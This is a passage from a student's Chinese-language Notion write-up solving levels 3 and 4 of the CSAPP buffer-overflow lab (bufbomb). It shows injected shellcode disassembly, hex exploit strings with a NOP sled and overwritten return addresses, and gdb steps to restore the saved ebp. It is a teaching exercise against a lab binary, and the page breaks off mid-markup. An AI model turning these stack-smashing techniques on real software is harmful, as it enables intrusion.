 #0x8048e50即 lever3需要的返回地址</span></span></span></code></pre><div id="https://www.notion.so/d0a4566b99414127b441af5d33800c84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">出现一个新问题，之前覆盖返回地址时，oldebp均用00000000覆盖了，因为我要调用新的函数，oldebp不再被需要，但现在需要返回test，需要oldebp，所以还需要通过gdb找到oldebp</span></span></p></div><pre id="https://www.notion.so/6dd84e90da9a4109a0abcc42e07f4903" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax
   5:	68 50 8e 04 08       	push   $0x8048e50
   a:	c3                   	ret    </span></span></span></code></pre><div id="https://www.notion.so/3d22c520cce5447ba02d18983923c7a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">对应oldebp，它存储在ebp指向的地址         →</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x55683220</code></span></span></p></div><div id="https://www.notion.so/354c3cda747b46f1a16384b9ef641d89" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fad33413e-f83f-4dbd-88cb-95edb3ff15bc%2FUntitled.png?width=605&amp;table=block&amp;id=354c3cda-747b-46f1-a163-84b9ef641d89"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fad33413e-f83f-4dbd-88cb-95edb3ff15bc%2FUntitled.png?width=605&amp;table=block&amp;id=354c3cda-747b-46f1-a163-84b9ef641d89" style="width:605px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d3c8c80dfc534fe38bd3eb9f946c6090" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">b8 28 4e 6b 20 68 50 8e 04 08</strong></mark></span></span></p></div><div id="https://www.notion.so/5537005e473242959acc8f1aa6c57f7e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">c3 00 00 00 00 00 00 00 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/5b5d41081df04eee9b3e49264e220c8b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/afdc3700da3b4c0f95e7c8c748d47190" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/096bbbffaa864aec949501c8e7d26f00" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span class="SemanticString__Fragment SemanticString__Fragment--Commented"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">20 32 68 55</mark></span></strong></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"> c8 31 68 55</strong></mark></span></span></p></div><div id="https://www.notion.so/e6cb8ce8e6ee4dfca530d34a8a30eddb" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F73f8da1f-ce65-498a-8d17-94265a877708%2FUntitled.png?width=708&amp;table=block&amp;id=e6cb8ce8-e6ee-4dfc-a530-d34a8a30eddb"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F73f8da1f-ce65-498a-8d17-94265a877708%2FUntitled.png?width=708&amp;table=block&amp;id=e6cb8ce8-e6ee-4dfc-a530-d34a8a30eddb" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h1 id="https://www.notion.so/4aa66bfeda014204a256bafbdc849d69" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/4aa66bfeda014204a256bafbdc849d69"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever4-Nitroglycerin 硝酸甘油</span></span></h1><div id="https://www.notion.so/302a3a078b694ef190a4fce13f4f9c06" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">用-n标准来运行，不再调用getbuf，调用getbufn,拥有520字节缓冲区，需要提供五次字符串，指向getbufn五次，每次都有不同偏移量，需要这五次均返回cookie，最后需要恢复到testn</span></span></p></div><div id="https://www.notion.so/3402ae0f9f804328a399f74f34824656" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">没咋看懂， 😵‍💫</span></span></p></div><div id="https://www.notion.so/d37ef19b13514864a504258366cf15c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat lever4.txt | ./hex2raw -n | ./bufbomb -n -u 202208060120</code></span></span></p></div><div id="https://www.notion.so/f217e1c70e4346fdbf80f614d0eb4a0f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"> ./hex2raw -n</code></span><span class="SemanticString"> 是啥意思，好像是让一个文件重复去输入五次（创建副本？）</span></span></p></div><div id="https://www.notion.so/dabe91f8fc154ed8b36279e8697e50e0" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F6c487682-d708-4697-890c-febe2ebf1b5c%2FUntitled.png?width=1274&amp;table=block&amp;id=dabe91f8-fc15-4ed8-b362-79e8697e50e0"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F6c487682-d708-4697-890c-febe2ebf1b5c%2FUntitled.png?width=1274&amp;table=block&amp;id=dabe91f8-fc15-4ed8-b362-79e8697e50e0" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9baa4427a7d1422baa65ed631d258dce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">原来是这么个运行五次</span></span></p></div><div id="https://www.notion.so/215ca22abf5f405dafb3269a0bd772eb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">先思考第一次怎么成功吧</span></span></p></div><div id="https://www.notion.so/5edeb59df45b44ab8957093c3e5e467f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">哦哦，好像知道了</span></span></p></div><div id="https://www.notion.so/cbf3f0e8fe364291b62749f3ba750ed5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">最终的格式是</span></span></p></div><div id="https://www.notion.so/5d9778973cd24e46980dc2e71aea095c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">90 …… 恶意汇编  oldebp 返回地址</span></span></p></div><div id="https://www.notion.so/8b3f7d89a3274061a84b41073613eaa8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">其实和lever3一样，但是每次调用的栈帧位置会不一样，所以</span></span></p></div><pre id="https://www.notion.so/619ff82b85ac41319fa1e5587cf82b05" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08048cce <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>testn</span><span class="token punctuation">></span></span>:
……
 8048cdd:	e8 62 05 00 00       	call   8049244 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getbufn</span><span class="token punctuation">></span></span>
 8048ce2:	89 c3                	mov    %eax,%ebx
 #返回地址是0x8048ce2</span></span></span></code></pre><pre id="https://www.notion.so/ec9fe1520c7e451ba1e605674c2ca8cf" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax
   5:	68 e2 8c 04 08       	push   $0x8048ce2
   a:	c3                   	ret    </span></span></span></code></pre><div id="https://www.notion.so/e95d378bbfd6450d815086e5b8bc57db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在这个基础上，要想办法通过恶意汇编指令去获取oldebp并修改，而不是像lever3那样gdb调试得到唯一的返回地址</span></span></p></div><div id="https://www.notion.so/98fbf6e2308d41eea19795db50a900d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">并且由于每次的栈帧位置不同，得将恶意汇编放在靠后的位置，前面通过nop指令（不执行任何操作，它仅仅是一个占位符指令,</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">二进制码90</strong></span><span class="SemanticString">）填充→说明需要调试五次调用中最大的缓冲区起始地址（这样对于最大的地址从最开始执行nop，由于缓冲区足够长，将恶意指令放在最后，对应其他的四个从中间开始执行nop，他们都会在最后执行恶意汇编）</span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">最后补个图在这</em></span></span></p></div><div id="https://www.notion.so/02df50b8d6df46ed9179305b621b9ea9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在getbufn打断点，看缓冲区在哪开始(</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">p/x $ebp-0x208</code></span><span class="SemanticString">)</span></span></p></div><div id="https://www.notion.so/2b7baa1a7a1a4a749fbc11ca385849f2" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fe2ca3928-143e-4f7b-85da-6917a66255f1%2FUntitled.png?width=452&amp;table=block&amp;id=2b7baa1a-7a1a-4a74-9fbc-11ca385849f2"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fe2ca3928-143e-4f7b-85da-6917a66255f1%2FUntitled.png?width=452&amp;table=block&amp;id=2b7baa1a-7a1a-4a74-9fbc-11ca385849f2" style="width:452px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0b3b49b35d7f478b92233d16c5c8e895" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">这里面最大的</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">返回地址</strong></span><span class="SemanticString">是</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x55682fe8</code></span></span></p></div><div id="https://www.notion.so/e717d40bf32e49eaa2a05ca2b46ad52c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">每次栈帧都不一样，直接去调试得到肯定不可能了</span></span></p></div><div id="https://www.notion.so/5acea43bb3874eacae555f4c3f7e56d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">如何</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">利用恶意汇编恢复oldebp</strong></span><span class="SemanticString">捏 </span></span></p></div><pre id="https://www.notion.so/eda08330eb2c4506af6628736adc57bb" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08048cce <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>testn</span><span class="token punctuation">></span></span>:
 8048cce:	55                   	push   %ebp
 8048ccf:	89 e5                	mov    %esp,%ebp
 8048cd1:	53                   	push   %ebx
 8048cd2:	83 ec 24             	sub    $0x24,%esp
 #一个push %ebx和一个sub，说明esp+0x28就是ebp的位置</span></span></span></code></pre><div id="https://www.notion.so/a1efe04983a44222b784daab488a5583" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在testn调用了getbufn返回后，esp的位置是不变的（尽管每次getbufn的栈帧不同）</span></span></p></div><div id="https://www.notion.so/3719d398d57f4c978d98851e4db675c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在恶意汇编中，通过获取esp+0x28得到ebp，如此完成了恢复ebp</span></span></p></div><pre id="https://www.notion.so/994aab3910ec41abb5c27b87a2c80d06" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax  #eax放cookie
   5:	8d 6c 24 28          	lea    0x28(%esp),%ebp  #利用esp恢复ebp
   9:	68 50 8e 04 08       	push   $0x8048e50
   e:	c3                   	ret   #让eip执行正确返回地址</span></span></span></code></pre><div id="https://www.notion.so/28f4b06368044e4f97cb33c70e13c3b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/3c2df3d9740e4013a9c4b3d0163113f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/86573677757742caa8b06c8b227a464d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/f7269c0b6a7a450db15961a91bc738b9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/88fbeea29ff04f018a90990b4591b7e7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/3338503dfbe048c69d339f4c51057962" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/b5d43f5abf804a51b582ffb5b583adff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/4257e8925b1e4c95a0c71ae0e3e94464" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/c8142c1977554b3db14aecbcb07e82a4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/324ad93c29744649985dc0b0b9e6cce9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/78905a2be0ee4ecc8733ce9c55eeefbb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/31a779b8566e4c49b342f6b31318a8e6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/9e70e5cb263e456096c145d4ee704121" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/c30383f0abd1428a9e8277f2cabefa98" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/1ed9e2a7159d4a73bd23266690da46fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/441a01db2b244b2db1f50910e0595fea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/f37b132f967243aaa6c34ad66857d952" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/3ff68b2152b04879904b7c80dc6645bf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/7b6c439394c24b85bae742786b81b00c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/e6efe79710d7406aa42ff6d87e168601" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 </mark></span></span></p></div><div id="https://www.notion.so/030aa9dca1c64554867b3482bfd1d45a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">90 90 90 90 90 b8 28 4e 6b 20 8d 6c 24 28 68 50 8e 04 08 c3</mark></span></span></p></div><div id="https://www.notion.so/989187d761b94f5e9e3f475b7bf1b0e3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><span class="SemanticString__Fragment SemanticString__Fragment--Commented">00 00 00 00</span></mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"> </mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><span class="SemanticString__Fragment SemanticString__Fragment--Commented">e8 2f 68 55</span></mark></span></span></p></div><div id="https://www.notion.so/3ff1f96b729a41c398c33796200c8ca8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">505个nop+15恶意汇编+4空出的返回地址（最后会恢复）+4返回地址</span></span></p></div><div id="https://www.notion.so/dfffb8ce2d154923963c5e589adf0f4d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F9043385f-ca15-4e02-b238-ca4aa2cff764%2FUntitled.png?width=1075&amp;table=block&amp;id=dfffb8ce-2d15-4923-963c-5e589adf0f4d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F9043385f-ca15-4e02-b238-ca4aa2cff764%2FUntitled.png?width=1075&amp;table=block&amp;id=dfffb8ce-2d15-4923-963c-5e589adf0f4d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/8b3dc932e0b04d7abb09b70f76a8fbc7" class="Image Image--Normal"><figure><a href="https://media.tenor.com/8tgG_KyJqqwAAAAi/happy-happy-happy-happy.gif?width=127.99478912353516"><img src="https://media.tenor.com/8tgG_KyJqqwAAAAi/happy-happy-happy-happy.gif?width=127.99478912353516" style="width:127.99478912353516px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/17ba70bdb92347a78ab8592b027bb397" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fd687b8e6-fbac-4561-b85a-143a63418916%2FUntitled.png?width=554&amp;table=block&amp;id=17ba70bd-b923-47a7-8ab8-592b027bb397"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fd687b8e6-fbac-4561-b85a-143a63418916%2FUntitled.png?width=554&amp;table=block&amp;id=17ba70bd-b923-47a7-8ab8-592b027bb397" style="width:554px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0717de9d4f624bbd8a580cb99c326feb" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fe5615b43-c43a-4732-a783-8011d4ad471b%2FUntitled.png?width=553&amp;table=block&amp;id=0717de9d-4f62-4bbd-8a58-0cb99c326feb"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fe5615b43-c43a-4732-a783-8011d4ad471b%2FUntitled.png?width=553&amp;table=block&amp;id=0717de9d-4f62-4bbd-8a58-0cb99c326feb" style="width:553px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/622321fb5fd846fba0d302302fbade0f" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F07b919a3-6af9-4714-9af1-542ae31c2930%2FUntitled.png?width=554&amp;table=block&amp;id=622321fb-5fd8-46fb-a0d3-02302fbade0f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F07b919a3-6af9-4714-9af1-542ae31c2930%2FUntitled.png?width=554&amp;table=block&amp;id=622321fb-5fd8-46fb-a0d3-02302fbade0f" style="width:554px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/aad8d86f3b5e44b6a0ba0197dc6e5ee2" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F5c6c869a-1860-413d-9589-745c09e1fbcc%2FUntitled.png?width=553&amp;table=block&amp;id=aad8d86f-3b5e-44b6-a0ba-0197dc6e5ee2"><img 